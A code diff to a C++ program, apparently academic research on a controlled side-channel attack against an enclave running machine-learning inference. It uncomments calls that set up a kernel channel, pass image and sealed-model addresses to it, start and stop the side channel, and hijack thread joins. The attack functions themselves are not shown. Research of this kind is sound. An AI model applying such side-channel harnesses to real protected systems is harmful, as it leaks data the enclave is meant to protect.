@@ -347,7 +347,7 @@ int main(int argc, char* argv[])
     unsigned int target_count = 0;
 
     // Riccardo
-    // setup_kernel_channel();
+    setup_kernel_channel();
 
     uint64_t *nuke;
     posix_memalign((void **)&nuke, 4096, 512 * sizeof(uint64_t));
@@ -360,14 +360,14 @@ int main(int argc, char* argv[])
         if(ds.labels[i] == 0)
         {
             // Riccardo
-            // send_image_address((void*)&ds.images[i * 4096]);
+            send_image_address((void*)&ds.images[i * 4096]);
             target_count++;
             tempor = i * 4096;
         }
     }
 
     // Riccardo
-    // send_image_address((void *)&(nuke[0]));
+    send_image_address((void *)&(nuke[0]));
 
     std::cout << std::endl << target_count << " target label images" <<
         std::endl << std::endl;
@@ -397,10 +397,10 @@ int main(int argc, char* argv[])
     }
 
     // Riccardo
-    // send_model_address(sealed_buf);
+    send_model_address(sealed_buf);
 
     // Riccardo
-    // start_controlled_side_channel();
+    start_controlled_side_channel();
 
     // The address passed does not work
     // printf("%d\n", ds.images[tempor]);   // not detected :(
@@ -442,7 +442,7 @@ int main(int argc, char* argv[])
     for (int i = 0; i < THREAD_NUM; i++)
     {
         // Riccardo
-        // pthread_join_hijack(i);
+        pthread_join_hijack(i);
 
        // cout << "Hijacked thread " << i << endl;
        // trd[i].join();
@@ -463,7 +463,7 @@ int main(int argc, char* argv[])
     }
 
     // Riccardo
-    // stop_controlled_side_channel();
+    stop_controlled_side_channel();
 
     return 0;
 }
